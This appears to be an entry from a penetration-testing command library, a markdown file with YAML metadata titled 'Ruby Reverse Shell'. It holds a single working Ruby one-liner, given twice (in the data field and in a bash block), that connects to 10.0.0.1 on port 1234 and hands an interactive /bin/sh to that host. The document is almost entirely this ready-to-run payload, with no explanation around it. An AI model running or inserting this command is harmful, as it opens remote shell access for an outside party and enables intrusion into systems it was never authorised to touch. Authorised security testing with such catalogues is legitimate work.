---
id: b63b43d7-96bc-4fff-892f-0c98b3c211a3
name: Ruby Reverse Shell
type: command
executor: null
data: 'ruby -rsocket -e''f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh
  -i <&%d >&%d

  2>&%d",f,f,f)'''
output: null
created_at: '2019-09-17T20:45:43.020312+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Ruby Reverse Shell

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d
2>&%d",f,f,f)'
```


